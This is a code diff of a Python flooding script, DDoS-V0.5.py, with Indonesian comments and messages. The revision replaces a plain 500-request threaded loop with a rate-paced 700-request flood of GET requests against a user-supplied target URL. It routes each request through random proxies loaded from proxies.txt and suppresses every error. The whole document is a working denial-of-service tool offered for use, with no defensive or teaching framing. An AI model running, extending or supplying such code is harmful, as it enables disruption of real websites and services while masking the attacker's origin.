@@ -1,39 +1,48 @@
-import requests
 import threading
+import requests
 import sys
 import time
+import random
 
-# Fungsi untuk mengirim request
-def send(url):
-    try:
-        requests.get(url)
-    except Exception as e:
-        pass  # Tidak ada output error
+MAX_REQUESTS = 700
+DURATION = 10  # detik
+THREADS = 100
 
-# Fungsi utama untuk melakukan DDoS
+proxies_list = []
+try:
+    with open("proxies.txt", "r") as f:
+        proxies_list = [line.strip() for line in f if line.strip()]
+except:
+    proxies_list = []
+
+def get_proxy():
+    if proxies_list:
+        proxy = random.choice(proxies_list)
+        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+    return None
+
 def attack(url):
-    print(f"\n[+] Proses Mengirim Serangan Ke IP Tersebut: {url}")
-    
+    try:
+        requests.get(url, proxies=get_proxy(), timeout=5)
+    except:
+        pass
+
+def start_attack(url):
+    print("\n[INFO] Proses Mengirim Serangan...")
     threads = []
     start_time = time.time()
+    for i in range(MAX_REQUESTS):
+        t = threading.Thread(target=attack, args=(url,))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+        time.sleep(DURATION / MAX_REQUESTS)
+    for t in threads:
+        t.join()
+    print("[INFO] Selesai Mengirim Serangan.")
 
-    # Menjalankan thread untuk mengirim request
-    for _ in range(500):  # 500 request secara otomatis
-        thread = threading.Thread(target=send, args=(url,))
-        thread.start()
-        threads.append(thread)
-
-    # Menunggu semua thread selesai
-    for thread in threads:
-        thread.join()
-
-    end_time = time.time()
-    print(f"[✓] Selesai Mengirim Serangan (50.000 request) dalam {end_time - start_time:.2f} detik\n")
-
-# Fungsi utama yang menerima input dan memulai serangan
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: python DDoS-V0.5.py <url>")
+        print("Usage: python DDoS-V0.5.py http://<target>")
     else:
-        url = sys.argv[1]  # URL target
-        attack(url)
+        start_attack(sys.argv[1])
